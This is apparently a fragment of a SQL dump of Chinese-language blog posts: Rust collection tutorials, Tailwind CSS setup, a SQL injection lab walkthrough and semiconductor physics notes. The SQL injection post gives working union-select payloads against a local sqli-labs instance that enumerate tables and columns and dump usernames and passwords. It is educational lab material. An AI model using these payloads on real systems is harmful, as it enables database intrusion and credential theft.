并没有空值，不过它确实拥有一个可以编码存在或不存在概念的枚举。这个枚举是 `Option<T>`，而且它[定义于标准库中](https://rustwiki.org/zh-CN/std/option/enum.Option.html)，如下:\r\n\r\n```rust\r\nenum Option<T> {\r\n    Some(T),\r\n    None,\r\n}\r\n```\r\n\r\n## 6.2 match 控制流运算符\r\n\r\n### match\r\n\r\n```rust\r\nenum Coin {\r\n    Penny,\r\n    Nickel,\r\n    Dime,\r\n    Quarter,\r\n}\r\n\r\nfn value_in_cents(coin: Coin) -> u8 {\r\n    match coin {\r\n        Coin::Penny => 1,\r\n        Coin::Nickel => 5,\r\n        Coin::Dime => 10,\r\n        Coin::Quarter => 25,\r\n    }\r\n}\r\n```\r\n\r\n### 绑定值的模式\r\n\r\n匹配分支的另一个有用的功能是可以绑定匹配的模式的部分值。这也就是如何从枚举成员中提取值的。\r\n\r\n```rust\r\n#[derive(Debug)] // 这样可以立刻看到州的名称\r\nenum UsState {\r\n    Alabama,\r\n    Alaska,\r\n    // --snip--\r\n}\r\n\r\nenum Coin {\r\n    Penny,\r\n    Nickel,\r\n    Dime,\r\n    Quarter(UsState),\r\n}\r\n```\r\n\r\n### 匹配 `Option<T>`\r\n\r\n比如我们想要编写一个函数，它获取一个 `Option<i32>` ，如果其中含有一个值，将其加一。如果其中没有值，函数应该返回 `None` 值，而不尝试执行任何操作。\r\n\r\n```rust\r\n    fn plus_one(x: Option<i32>) -> Option<i32> {\r\n        match x {\r\n            None => None,\r\n            Some(i) => Some(i + 1),\r\n        }\r\n    }\r\n\r\n    let five = Some(5);\r\n    let six = plus_one(five);\r\n    let none = plus_one(None);\r\n```\r\n\r\n### 通配模式和 `_` 占位符\r\n\r\n让我们看一个例子，我们希望对一些特定的值采取特殊操作，而对其他的值采取默认操作。想象我们正在玩一个游戏，如果你掷出骰子的值为 3，角色不会移动，而是会得到一顶新奇的帽子。如果你掷出了 7，你的角色将失去新奇的帽子。对于其他的数值，你的角色会在棋盘上移动相应的格子。这是一个实现了上述逻辑的 `match`。\r\n\r\n```rust\r\n	let dice_roll = 9;\r\n    match dice_roll {\r\n        3 => add_fancy_hat(),\r\n        7 => remove_fancy_hat(),\r\n        _ => (),\r\n    }\r\n\r\n    fn add_fancy_hat() {}\r\n    fn remove_fancy_hat() {}\r\n```\r\n\r\n## `if let` 简单控制流\r\n\r\n### 语法\r\n\r\n```rust\r\nif let Some(3) = some_u8_value {\r\n    println!(\"three\");\r\n}\r\n```\r\n\r\n# 7. [使用包、Crate和模块管理不断增长的项目](https://rustwiki.org/zh-CN/book/ch07-00-managing-growing-projects-with-packages-crates-and-modules.html#使用包crate和模块管理不断增长的项目)\r\n\r\n# 8. 常见集合\r\n\r\n## 8.1 Vector\r\n\r\n### 新建 vector\r\n\r\n为了创建一个新的空 vector，可以调用 `Vec::new` 函数。\r\n\r\n```rust\r\nlet v: Vec<i32> = Vec::new();\r\n```\r\n\r\n### 更新 vector\r\n\r\n```rust\r\nlet mut v = Vec::new();\r\n\r\nv.push(5);\r\nv.push(6);\r\nv.push(7);\r\nv.push(8);\r\n```\r\n\r\n### 丢弃 vector 时也会丢弃其所有元素\r\n\r\n类似于任何其他的 `struct`，vector 在其离开作用域时会被释放。\r\n\r\n```rust\r\n{\r\n    let v = vec![1, 2, 3, 4];\r\n\r\n    // 处理变量 v\r\n\r\n} // <- 这里 v 离开作用域并被丢弃\r\n```\r\n\r\n### 读取 vector 的元素\r\n\r\n```rust\r\nlet v = vec![1, 2, 3, 4, 5];\r\n\r\nlet third: &i32 = &v[2];\r\nprintln!(\"The third element is {}\", third);\r\n\r\nmatch v.get(2) {\r\n    Some(third) => println!(\"The third element is {}\", third),\r\n    None => println!(\"There is no third element.\"),\r\n}\r\n```\r\n\r\n### 遍历 vector 中的元素\r\n\r\n```rust\r\nlet v = vec![100, 32, 57];\r\nfor i in &v {\r\n    println!(\"{}\", i);\r\n}\r\n```\r\n\r\n我们也可以遍历可变 vector 的每一个元素的可变引用以便能改变他们。\r\n\r\n```rust\r\nlet mut v = vec![100, 32, 57];\r\nfor i in &mut v {\r\n    *i += 50;\r\n}\r\n```\r\n\r\n### 使用枚举来储存多种类型\r\n\r\n```rust\r\nenum SpreadsheetCell {\r\n    Int(i32),\r\n    Float(f64),\r\n    Text(String),\r\n}\r\n\r\nlet row = vec![\r\n    SpreadsheetCell::Int(3),\r\n    SpreadsheetCell::Text(String::from(\"blue\")),\r\n    SpreadsheetCell::Float(10.12),\r\n];\r\n```\r\n\r\n## 8.2 String\r\n\r\n### 什么是字符串？\r\n\r\n在开始深入这些方面之前，我们需要讨论一下术语 **字符串** 的具体意义。Rust 的核心语言中只有一种字符串类型：`str`，字符串 slice，它通常以被借用的形式出现，`&str`。第 4 章讲到了 **字符串 slice**：它们是一些储存在别处的 UTF-8 编码字符串数据的引用。比如字符串字面量被储存在程序的二进制输出中，字符串 slice 也是如此。\r\n\r\n称作 `String` 的类型是由标准库提供的，而没有写进核心语言部分，它是可增长的、可变的、有所有权的、UTF-8 编码的字符串类型。当 Rustacean 们谈到 Rust 的 “字符串”时，它们通常指的是 `String` 和字符串 slice `&str` 类型，而不仅仅是其中之一。虽然本部分内容大多是关于 `String` ，不过这两个类型在 Rust 标准库中都被广泛使用，`String` 和字符串 slice 都是 UTF-8 编码。\r\n\r\nRust 标准库中还包含一系列其他字符串类型，比如 `OsString`、`OsStr`、`CString` 和 `CStr`。相关库 crate 甚至会提供更多储存字符串数据的选择。看到这些由 `String` 或是 `Str` 结尾的名字了吗？这对应着它们提供的所有权和可借用的字符串变体，就像是你之前看到的 `String` 和 `str`。举例而言，这些字符串类型能够以不同的编码，或者内存表现形式上以不同的形式，来存储文本内容。本章将不会讨论其他这些字符串类型，更多有关如何使用它们以及各自适合的场景，请参见其 API 文档。\r\n\r\n### 新建字符串\r\n\r\n很多 `Vec` 可用的操作在 `String` 中同样可用，从 `new` 函数创建字符串开始。\r\n\r\n```rust\r\nlet mut s = String::new();\r\n```\r\n\r\n这新建了一个叫做 `s` 的空的字符串，接着我们可以向其中装载数据。通常字符串会有初始数据，因为我们希望一开始就有这个字符串。为此，可以使用 `to_string` 方法，它能用于任何实现了 `Display` trait 的类型，字符串字面量也实现了它。\r\n\r\n```rust\r\nlet data = \"initial contents\";\r\n\r\nlet s = data.to_string();\r\n\r\n// 该方法也可直接用于字符串字面量：\r\nlet s = \"initial contents\".to_string();\r\n```\r\n\r\n也可以使用 `String::from` 函数来从字符串字面量创建 `String`。下面的代码等同于使用 `to_string`。\r\n\r\n```rust\r\nlet s = String::from(\"initial contents\");\r\n```\r\n\r\n### 更新字符串\r\n\r\n`String` 的大小可以增加，其内容也可以改变，就像可以放入更多数据来改变 `Vec` 的内容一样。另外，可以方便的使用 `+` 运算符或 `format!` 宏来拼接 `String` 值。\r\n\r\n可以通过 `push_str` 方法来附加字符串 slice，从而使 `String` 变长。\r\n\r\n```rust\r\nlet mut s = String::from(\"foo\");\r\ns.push_str(\"bar\");\r\n```\r\n\r\n通常你会希望将两个已知的字符串合并在一起。一种办法是像这样使用 `+` 运算符。\r\n\r\n```rust\r\nlet s1 = String::from(\"Hello, \");\r\nlet s2 = String::from(\"world!\");\r\nlet s3 = s1 + &s2; // 注意 s1 被移动了，不能继续使用\r\n```\r\n\r\n对于更为复杂的字符串链接，可以使用 `format!` 宏。\r\n\r\n```rust\r\nlet s1 = String::from(\"tic\");\r\nlet s2 = String::from(\"tac\");\r\nlet s3 = String::from(\"toe\");\r\n\r\nlet s = format!(\"{}-{}-{}\", s1, s2, s3);\r\n```\r\n\r\n### 遍历字符串的方法\r\n\r\n```rust\r\nfor c in \"Hello\".chars() {\r\n    println!(\"{}\", c);\r\n}\r\n```\r\n\r\n## 8.3 Map\r\n\r\n### 哈希 map 储存键值对\r\n\r\n最后介绍的常用集合类型是 **哈希 map**（*hash map*）。`HashMap<K, V>` 类型储存了一个键类型 `K` 对应一个值类型 `V` 的映射。它通过一个 **哈希函数**（*hashing function*）来实现映射，决定如何将键和值放入内存中。\r\n\r\n### 新建一个哈希 map\r\n\r\n可以使用 `new` 创建一个空的 `HashMap`，并使用 `insert` 增加元素。\r\n\r\n```rust\r\nuse std::collections::HashMap;\r\n\r\nlet mut scores = HashMap::new();\r\n\r\nscores.insert(String::from(\"Blue\"), 10);\r\nscores.insert(String::from(\"Yellow\"), 50);\r\n```\r\n\r\n另一个构建哈希 map 的方法是使用一个元组的 vector 的 `collect` 方法。\r\n\r\n```rust\r\nuse std::collections::HashMap;\r\n\r\nlet teams  = vec![String::from(\"Blue\"), String::from(\"Yellow\")];\r\nlet initial_scores = vec![10, 50];\r\n\r\nlet scores: HashMap<_, _> = teams.iter().zip(initial_scores.iter()).collect();\r\n```\r\n\r\n这里 `HashMap<_, _>` 类型标注是必要的，因为 `collect` 有可能当成多种不同的数据结构，而除非显式指定否则 Rust 无从得知你需要的类型。但是对于键和值的类型参数来说，可以使用下划线占位，而 Rust 能够根据 vector 中数据的类型推断出 `HashMap` 所包含的类型。\r\n\r\n### 哈希 map 和所有权\r\n\r\n对于像 `i32` 这样的实现了 `Copy` trait 的类型，其值可以拷贝进哈希 map。对于像 `String` 这样拥有所有权的值，其值将被移动而哈希 map 会成为这些值的所有者。\r\n\r\n```rust\r\nuse std::collections::HashMap;\r\n\r\nlet field_name = String::from(\"Favorite color\");\r\nlet field_value = String::from(\"Blue\");\r\n\r\nlet mut map = HashMap::new();\r\nmap.insert(field_name, field_value);\r\n// 这里 field_name 和 field_value 不再有效，\r\n```\r\n\r\n### 访问哈希 map 中的值\r\n\r\n可以通过 `get` 方法并提供对应的键来从哈希 map 中获取值。\r\n\r\n```rust\r\nuse std::collections::HashMap;\r\n\r\nlet mut scores = HashMap::new();\r\n\r\nscores.insert(String::from(\"Blue\"), 10);\r\nscores.insert(String::from(\"Yellow\"), 50);\r\n\r\nlet team_name = String::from(\"Blue\");\r\nlet score = scores.get(&team_name);\r\n```\r\n\r\n可以使用与 vector 类似的方式来遍历哈希 map 中的每一个键值对，也就是 `for` 循环。\r\n\r\n```rust\r\nuse std::collections::HashMap;\r\n\r\nlet mut scores = HashMap::new();\r\n\r\nscores.insert(String::from(\"Blue\"), 10);\r\nscores.insert(String::from(\"Yellow\"), 50);\r\n\r\nfor (key, value) in &scores {\r\n    println!(\"{}: {}\", key, value);\r\n}\r\n```\r\n\r\n### 更新哈希 map\r\n\r\n```rust\r\nuse std::collections::HashMap;\r\n\r\nlet mut scores = HashMap::new();\r\n\r\nscores.insert(String::from(\"Blue\"), 10);\r\nscores.insert(String::from(\"Blue\"), 25);\r\n```\r\n\r\n我们经常会检查某个特定的键是否有值，如果没有就插入一个值。为此哈希 map 有一个特有的 API，叫做 `entry`，它获取我们想要检查的键作为参数。`entry` 函数的返回值是一个枚举，`Entry`，它代表了可能存在也可能不存在的值。\r\n\r\n```rust\r\nuse std::collections::HashMap;\r\n\r\nlet mut scores = HashMap::new();\r\nscores.insert(String::from(\"Blue\"), 10);\r\n\r\nscores.entry(String::from(\"Yellow\")).or_insert(50);\r\nscores.entry(String::from(\"Blue\")).or_insert(50);\r\n```\r\n\r\n# 9. [错误处理](https://rustwiki.org/zh-CN/book/ch09-00-error-handling.html#错误处理)\r\n\r\n# 10. 泛型 trait与生命周期\r\n\r\n','2023-12-24 01:31:38','2023-12-24 01:31:38'),(100007,100000,'React框架下的CSS方案推荐','### React框架下的CSS方案推荐\r\n\r\n#### Tailwind CSS入门\r\n\r\nTailwind CSS 的工作原理是扫描所有 HTML 文件、JavaScript 组件以及任何 模板中的 CSS 类（class）名，然后生成相应的样式代码并写入 到一个静态 CSS 文件中。\r\n\r\n**他快速、灵活、可靠，没有运行时负担。**\r\n\r\n#### 安装Tailwind CSS\r\n\r\n通过npm安装*tailwindcss*，然后创建*tailwind.config.js*配置文件\r\n\r\n```sh\r\n$ npm install -D tailwindcss\r\n$ npx tailwindcss inits\r\n```\r\n\r\n#### 配置模板文件的路径\r\n\r\n在*tailwind.config.js*配置文件里面添加模板文件的路径\r\n\r\n```js\r\n/** @type {import(\'tailwindcss\').Config} */\r\nmodule.exports = {\r\n  content: [\r\n    \"./src/**/*.{js,jsx,ts,tsx}\",\r\n  ],\r\n  theme: {\r\n    extend: {},\r\n  },\r\n  plugins: [],\r\n}\r\n```\r\n\r\n#### 加载Tailwind的指令\r\n\r\n在./src下新建*index.css*文件夹\r\n\r\n```css\r\n@tailwind base;\r\n@tailwind components;\r\n@tailwind utilities;\r\n```\r\n\r\n在*index.tsx*里面**import**\r\n\r\n``` tsx\r\nimport \'./index.css\'\r\n```\r\n\r\n#### 在TSX代码中使用Tailwind\r\n\r\n``` tsx\r\nconst Hello = () => {\r\n    return (\r\n    	<div className={\"text-[32px]\"}>\r\n        	Hello TailwindCSS \r\n        </div>\r\n    );\r\n}\r\nexport default Hello;\r\n```\r\n\r\n#### 运行项目\r\n\r\n```sh\r\n$ npm run start\r\n```\r\n\r\n\r\n\r\n\r\n\r\n','2023-12-24 15:38:17','2023-12-24 15:38:17'),(100008,100003,'SQL注入','# sql注入\r\n\r\n### sql注入简介\r\n\r\nSql注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。\r\n\r\n### Web程序三层架构\r\n\r\n**三层架构**(`3-tier architecture`) 通常意义上就是将整个业务应用划分为：\r\n\r\n- 界面层（User Interface layer）\r\n- 业务逻辑层（Business Logic Layer）\r\n- 数据访问层（Data access layer）。\r\n\r\n区分层次的目的即为了“高内聚低耦合”的思想。在软件体系架构设计中，分层式结构是最常见，也是最重要的一种结构被应用于众多类型的软件开发。\r\n 由数据库驱动的Web应用程序依从三层架构的思想也分为了三层：\r\n\r\n- 表示层。\r\n- 业务逻辑层（又称领域层）\r\n- 数据访问层（又称存储层）\r\n\r\n\r\n### sql字符型实例\r\n\r\n* ***判断注入点 —— 第一步***\r\n\r\n​	找页面与数据库**产生交互**的地方。\r\n\r\n​	我们找到界面中的 url	 \r\n\r\n```\r\nhttp://127.0.0.1:8080/sqlilabs/Less-1/\r\n```\r\n在页面中输入id之后\r\n\r\n```\r\nhttp://127.0.0.1:8080/sqlilabs/Less-1/?id=1\r\n```\r\n\r\n\r\n\r\n\r\n* ***判断回显点***\r\n\r\n```\r\nhttp://127.0.0.1:8080/sqlilabs/Less-1/?id=1\'\r\n```\r\n\r\n\r\n* ***判断字段数***\r\n\r\n   	order by当字段数小于等于数据库中的字段数，报错不会显示，而当字段数大于数据库中的字段数时，网页便会报错\r\n\r\n```\r\nhttp://127.0.0.1:8080/sqlilabs/Less-1/?id=1\'order by 3%23\r\n```\r\n\r\n其中%23在html url编码中代表#，当其运行在sql语句时，表示注释忽略接下来的sql语句防止报错\r\n\r\n\r\n\r\n```\r\nhttp://127.0.0.1:8080/sqlilabs/Less-1/?id=1%27order%20by4%23\r\n```\r\n\r\n字段报错，说明该数据库中的字段为3\r\n\r\n* ***查询数据库中的信息***\r\n\r\n  通过union select 语句查询当前数据库中的表名\r\n\r\n```\r\nhttp://127.0.0.1:8080/sqlilabs/Less-1/?id=1\' AND 1=2 union select% 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3%23\r\n```\r\n\r\n\r\n查询该数据库中的users的列名\r\n\r\n```\r\nhttp://127.0.0.1:8080/sqlilabs/Less-1/?id=1%27%20AND%201=2%20union%20select%201,2,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)%23\r\n```\r\n\r\n\r\n\r\n查询表中users的字段名\r\n\r\n```\r\nhttp://127.0.0.1:8080/sqlilabs/Less-1/?id=1%27%20AND%201=2%20union%20select%201,(select%20group_concat(password)%20from%20security.users)%20,(select%20group_concat(username)%20from%20security.users)%23\r\n```\r\n\r\n','2023-12-24 16:36:24','2023-12-24 18:44:15'),(100009,100001,'半导体物理学','# 半导体中的电子状态\r\n\r\n## 电子状态（能量状态）\r\n\r\n### 描述宏观物体：位置$X,Y,Z$ 动量$\\vec{P}$\r\n\r\n### 描述电子：能量$E$ 波矢$\\vec{k}$\r\n\r\n## 半导体中电子状态与能带\r\n\r\n### 孤立原子中电子状态：\r\n\r\n- ### 氢原子核外单电子：\r\n\r\n  #### 由薛定谔方程解得:\r\n\r\n  $E_n = - \\frac{m_0 q^4}{8 \\epsilon_0^2 h^2} \\cdot \\frac{1}{n^2} = -13.6\\frac{1}{n^2} \\qquad n = 1,2,3....$\r\n\r\n  #### 其中势场$V(x) \\propto \\frac{1}{r}$\r\n\r\n  #### 孤立原子核外的电子其状态是一系列分立的能量确定值，称之为能级\r\n\r\n- ### 多电子原子：多电子原子其电子状态仍然不连续\r\n\r\n  #### 描述其状态用以下量子数：\r\n\r\n  $$\r\n  主量子数 \\quad n \\\\\r\n  角量子数 \\quad l \\\\\r\n  磁量子数 \\quad m_l \\\\\r\n  自旋量子数 \\quad m_s\r\n  $$\r\n\r\n  \r\n\r\n### 自由电子状态：\r\n\r\n#### 一维情况：\r\n\r\n$$\r\n一维情况下的定态薛定谔方程：-\\frac{\\hbar^2}{2m_0}\\frac{\\mathrm{d}^2 \\psi(x)}{\\mathrm{d} x^2} + V(x)\\psi(x) = E\\psi(x)\\\\\r\n设 V(x) = Const = 0\\\\\r\n则 \\psi(x) = Ae^{i 2 \\pi \\vec{k} x} 或 Ae^{i \\vec{k} x} \\qquad (两公式的区别在于对波矢\\vec{k}的定义)\\\\\r\n当|\\vec{k}|=\\frac{1}{\\lambda}时，\\psi(x) = Ae^{i 2 \\pi \\vec{k} x} \\qquad 或 \\qquad 当|\\vec{k}|=\\frac{2 \\pi}{\\lambda}时，Ae^{i \\vec{k} x} \\quad 后续笔记以|\\vec{k}|=\\frac{1}{\\lambda}为主\\\\\r\n\\psi(x)-波函数 \\qquad A-振幅 \\qquad \\vec{k}\\quad - 波矢(方向为波面的法向) \\\\\r\n含时间的波函数：\\Phi(x,t)=Ae^{i 2 \\pi (\\vec{k} x - \\nu t)}\r\n$$\r\n\r\n#### 由粒子性：$动量\\vec{P} = m_0 \\upsilon \\quad 能量E = \\frac{P^2}{2 m_0}$ \r\n\r\n#### 再由德布罗意关系：$动量\\vec{P} = h\\vec{k} \\quad 能量E = h \\nu$\r\n\r\n#### 联立得自由电子在恒定势场的$E-k关系$：$E = \\frac{h^2 k^2}{2 m_0}$\r\n\r\n#### 可知自由电子的能量状态是连续的\r\n\r\n### 半导体中电子状态：\r\n\r\n#### 一维情况：\r\n\r\n$$\r\n一维情况下的定态薛定谔方程：-\\frac{\\hbar^2}{2m_0}\\frac{\\mathrm{d}^2 \\psi(x)}{\\mathrm{d} x^2} + V(x)\\psi(x) = E\\psi(x)\\\\\r\n确定晶体中的势场V(x)是个困难的问题 \\\\\r\n势场：半导体当中的电子是在严格周期性重复排列的原子之间运动 \\\\\r\n$$\r\n\r\n#### 单电子近似：设电子是在严格周期性重复排列并且是固定不动的原子核势场以及大量电子的平均势场下运动（固体物理核心内容），其内涵如下：\r\n\r\n1. ##### 单电子近似把研究晶体中电子状态的问题从原子核-电子的混合系统中分离了出来\r\n\r\n2. ##### 把众多电子相互牵制的复杂的多电子问题近似成为对某一电子的作用，只是一个平均势场的作用\r\n\r\n#### 根据单电子近似$V(x) = V(x + Sa) \\quad S:整数 \\quad a:晶格常数$\r\n\r\n$$\r\n\\begin{cases}\r\n-\\frac{\\hbar^2}{2m_0}\\frac{\\mathrm{d}^2 \\psi(x)}{\\mathrm{d} x^2} + V(x)\\psi(x) = E\\psi(x) \\\\\r\nV(x) = V(x + Sa)\r\n\\end{cases}\r\n$$\r\n\r\n#### Kronig-Penney模型：周期性势场\r\n\r\n![](https://www.zhuguishihundan.cn/image/17b9424abbdd5a06.png)\r\n\r\n### Bloch定理：\r\n\r\n#### Bloch证明了具有周期性势场的薛定谔方程其解析解一定具有以下形式：\r\n\r\n$$\r\n\\Psi_k(x) = u_k(x) e^{i 2 \\pi \\vec{k} x} \\\\\r\nu_k(x) = u_k(x + na) \\\\\r\nn是整数 \\qquad a是晶格常数 \\\\\r\n具有以上解析解形式的波函数称为Bloch波函数\r\n$$\r\n\r\n1. #### 自由电子：$\\Psi_{(x)} = Ae^{i 2 \\pi \\vec{k} x}$\r\n\r\n2. #### 晶体中电子:$\\Psi_{(x)} = u_{k(x)}e^{i 2 \\pi \\vec{k} x}$\r\n\r\n   - #### 形式上相似 都表示了一个波长为$1 \\over k$ 沿着k方向传播的平面波\r\n\r\n   #### 但晶体中的电子的周期性调质振幅$u_{k(x)}$取代了自由电子的恒定振幅$A$。\r\n\r\n   - #### 对自由电子 $|\\Psi_{(x)} \\cdot \\Psi_{(x)}^*| = A^2$表面电子在空间各点等几率出现，反映了电子在空间中做自由运动\r\n\r\n     #### 对晶体中电子 $|\\Psi_{k(x)} \\cdot \\Psi_{k(x)}^*| = |u_{k(x)} \\cdot u_{k(x)}^*|$晶体中找到该电子的几率具有周期性变化的性质，电子不再属于某一个原子，而是可以从一个原子“自由”运动到其他晶胞的对应点上---称为==共有化运动==\r\n\r\n   - #### Bloch波函数中的波矢$\\vec{k}$具有量子数的作用，不同的波矢$\\vec{k}$反映了不同的共有化运动状态\r\n\r\n### 拓展：\r\n\r\n#### 两种极端情况：\r\n\r\n1. #### 准自由电子近似\r\n\r\n   #### 从自由电子的状态出发，设想将一个自由电子放入晶体---由于晶格存在---电子波在传播过程中遭到反射---一般情况下---各反射波相互抵消---对前进波无重大影响\r\n\r\n   #### 但当满足布拉格反射条件就会形成驻波---其定态为驻波\r\n\r\n   #### 在一维晶体中 其布拉格反射条件为$k=\\frac{n}{2a},n=\\pm1,\\pm2……$ \r\n\r\n   #### 由量子力学理论，电子运动可看作是波包的运动，波包的群速度就是电子运动的平均速度 设波包的频率为$\\nu$,则电子的平均速度$\\upsilon = \\frac{\\mathrm{d}\\nu}{\\mathrm{d}k}$ 因$E = h\\nu \\quad \\therefore \\upsilon = \\frac{1}{h}\\frac{\\mathrm{d}E}{\\mathrm{d}k}$ \r\n\r\n   #### 在$k=\\frac{n}{2a}(n=\\pm1,\\pm2……)处\\upsilon = \\frac{1}{h}\\frac{\\mathrm{d}E}{\\mathrm{d}k}=0$ \r\n\r\n2. #### 紧束缚近似\r\n\r\n   #### 从孤立原子的核外电子的状态出发---视晶体为原子相互靠拢到一定程度的结果\r\n\r\n   #### 靠拢$\\Longrightarrow$电子共有化运动$\\longrightarrow$电子不再长时间停留在某原子的一定状态中而只停留有限时间$\\Delta t$$\\longrightarrow$根据测不准原理$\\Delta E \\cdot \\Delta t$~$h$\r\n\r\n   - #### 孤立原子中电子：$\\Delta t \\longrightarrow \\infty,\\Delta E \\longrightarrow 0$.能级\r\n\r\n   - #### 晶体中原子：$\\Delta t \\downarrow,\\Delta E \\uparrow$.能级长宽为能带\r\n\r\n   \r\n\r\n   #### 量子力学三大定律：测不准原理$\\Delta x \\cdot \\Delta p$~$h$、能量量子化、Pauli不相容\r\n\r\n#### 晶体中电子的状态既不同于自由电子的连续的E-k关系，也不同于孤立原子核外电子的状态（能级）,而是形成了一系列相间隔的允带与禁带。\r\n\r\n### 布里渊区与能带\r\n\r\n1. #### 在$k=\\frac{n}{2a},n=\\pm1,\\pm2……$ 处，能量出现不连续，形成了一系列相间隔的允带与禁带\r\n\r\n2. #### 一个布里渊区对应于一个允带\r\n\r\n3. #### 晶体中的$E-K$关系是周期性的，即$E(k) = E(k + \\frac{n}{a})$\r\n\r\n4. #### 第一布里渊区又称简约布里渊区\r\n\r\n   - ##### 一维下$-\\frac{1}{2a}< k <\\frac{1}{2a}$\r\n\r\n   - ##### 二维下$-\\frac{1}{2a}< [k_x,k_y] <\\frac{1}{2a}$\r\n\r\n   - ##### 三维下$-\\frac{1}{2a}< [k_x,k_y，k_z] <\\frac{1}{2a}$\r\n\r\n#### 能带中的量子态数\r\n\r\n#### 一维晶体中 用波恩-卡曼边界条件（循环边界条件）\r\n\r\n$$\r\n\\Psi_k(0) = \\Psi_k(L) \\\\\r\nL = N \\cdot a \\\\\r\n由上式可得u_k(0) = u_k(L)e^{i 2 \\pi k L} \\\\\r\n\\because u_k(0) \\equiv u_k(L) \\\\\r\n\\therefore e^{i 2 \\pi k L} = 1 \\quad 2 \\pi k L = 2 \\pi n,n=0,\\pm1,\\pm2······ \\\\\r\n\\therefore k = \\frac{n}{L}\r\n$$\r\n\r\n##### 推广到三维：\r\n\r\n$$\r\nk_x = \\frac{n_x}{L} \\\\\r\nk_y = \\frac{n_y}{L} \\\\\r\nk_z = \\frac{n_z}{L} \\\\\r\n\\qquad \\qquad(n_x,n_y,n_z)=0,\\pm1,\\pm2······\r\n$$\r\n\r\n#### 波矢k的取值在k空间中是均匀分布的\r\n\r\n#### 一维晶体中\r\n\r\n##### 一个布里渊区的“长度”：$\\frac{1}{2a} - (-\\frac{1}{2a}) =\\frac{1}{a}$.\r\n\r\n##### 一个允许的k的取值所占“长度”：$k = \\frac{1}{L}$\r\n\r\n##### 所以k的取值为$\\frac{1}{a}/\\frac{1}{L} = \\frac{L}{a} = N$.\r\n\r\n##### 每个布里渊区（也就是一个能带） 共有N个k的取值，它们均匀的分布在k空间，每一个允许的k对应了一个能量状态（能级），所以一个布里渊区（能级）共有N个能级。\r\n\r\n##### ==因为每一个能级上可以容纳自旋相反的两个电子，所以每个允带中最多可以容纳2N个电子。==\r\n\r\n##### ==每个允带中电子的能量也是不连续的，能带是由许多密集的能级组成。因为N很大，而一个允带的宽度越几个电子伏特，所以能级间隔很小，所以能级是近似连续的，称为准连续。==\r\n\r\n##### N：固体物理学原胞数 晶格的最小周期单元，只反映周期性而不反映各种对称性，一个原胞平均包含一个格点。\r\n\r\n### 导体、半导体、绝缘体的能带\r\n\r\n- #### 满带中的电子不参与导电\r\n\r\n  $$\r\n  在外加电场的作用下： \\\\\r\n  \\mathrm{d}E = q \\epsilon \\mathrm{d}s = q \\epsilon \\upsilon  \\mathrm{d}t = q \\epsilon \\frac{1}{h} \\frac{\\mathrm{d}E}{\\mathrm{d}k} \\\\\r\n  \\therefore \\frac{\\mathrm{d}k}{\\mathrm{d}t}=\\frac{q \\epsilon}{h} = Const(如果电场恒定)\r\n  $$\r\n\r\n- #### 半满带中的电子在外电场的作用下可以导电\r\n\r\n  ##### 半满带中的电子在外电场作用下的运动，即改变了能量状态也改变了分布情况，所以参与导电。\r\n\r\n- #### 导体总存在一个半满带，绝缘体的能带和$0K$时半导体的能带是相似的\r\n\r\n  ##### 半导体禁带宽度$E_g$通常在$1eV$左右。\r\n\r\n  $$\r\n  如300K下：Si的E_g=1.12eV \\quad Ge的E_g=0.67eV \\quad GaAs的E_g=1.43eV\r\n  $$\r\n\r\n  ##### 在半导体中，当外界条件变化时，如温度升高，满带顶部的少量电子可以获得能量跃迁到上一个空带的底部附近，使得满带中的大量电子（通常把满带中少量电子跃迁后剩余的大量电子对电流的贡献用少量的带正电的准粒子加以等效描述---称为==空穴==）与空带中的少量电子都参与导电。\r\n\r\n#### 本征半导体：纯净的不含有任何缺陷和杂质的半导体\r\n\r\n#### 本征激发：价带顶电子获得能量跃迁进入导带底成为导电电子（共价键上的电子挣脱共价键的束缚成为“自由电子”的过程）\r\n\r\n#### 本征激发特征：导带电子和价带空穴是成对出现的\r\n\r\n#### 价带顶$E_v$:价带能量最大值\r\n\r\n#### 导带底$E_c$:导带能量最小值\r\n\r\n#### 禁带宽度$E_g$:$E_g = E_c - E_v$\r\n\r\n## 有效质量\r\n\r\n#### 半导体中电子的$E-k$关系\r\n\r\n$$\r\n设导带极小值位于k=0处(布里渊区中心)，极小值E_c. \\\\\r\n在k=0附近将E(k)按泰勒级数展开. \\\\\r\nE(k) = E_c + (\\frac{ \\mathrm{d}E }{ \\mathrm{d}k })_{k=0}k + \\frac{1}{2}(\\frac{ \\mathrm{d}^2E }{ \\mathrm{d}k^2 })_{k=0}k^2 + ····· \\\\\r\n\\therefore E(k) - E(c) = \\frac{1}{2}(\\frac{ \\mathrm{d}^2E }{ \\mathrm{d}k^2 })_{k=0}k^2 \\\\\r\n与自由电子E-k关系类比：E(k) = \\frac{h^2 k^2}{2 m_0} \\\\\r\n令\\frac{1}{m_n^*} = \\frac{1}{h^2}(\\frac{ \\mathrm{d}^2E }{ \\mathrm{d}k^2 })_{k=0} \\\\\r\n则导带底附近电子的E-k关系为：E(k) - E(c)= \\frac{h^2 k^2}{2 m_n^*} \\\\\r\n\\because 导带底E(k) > E(0) \\\\\r\n\\therefore 导带底m_n^* > 0 \\\\\r\n同理对价带顶附近电子处理得：\\\\\r\nE(k) - E(v) = \\frac{1}{2}(\\frac{ \\mathrm{d}^2E }{ \\mathrm{d}k^2 })_{k=0}k^2 \\\\\r\n则价带顶附近电子的E-k关系为：E(k) - E(v)= \\frac{h^2 k^2}{2 m_n^*} \\\\\r\n\\because 价带顶E(k) < E(0) \\\\\r\n\\therefore 价带顶m_n^* < 0\r\n$$\r\n\r\n#### 晶体中的电子引入有效质量$m_n^*$后，其$E-k$关系与自由电子相似\r\n\r\n### 半导体中电子的平均速度\r\n\r\n$$\r\n\\upsilon = \\frac{1}{h} \\frac{ \\mathrm{d}E }{ \\mathrm{d}k } \\\\\r\n自由电子：E(k) = \\frac{h^2 k^2}{2 m_0} , \\upsilon = \\frac{h k}{ m_0} \\\\\r\n半导体中的电子：E(k) - E(c)= \\frac{h^2 k^2}{2 m_n^*}, \\upsilon = \\frac{1}{h} \\frac{ \\mathrm{d} }{ \\mathrm{d}k }(E_c + \\frac{h^2 k^2}{2 m_n^*}) = \\frac{h k}{ m_n^* } \\\\\r\n二者形式相似，但\\upsilon的符号即和波矢\\vec{k}又与有效质量m_n^*有关\r\n$$\r\n\r\n### 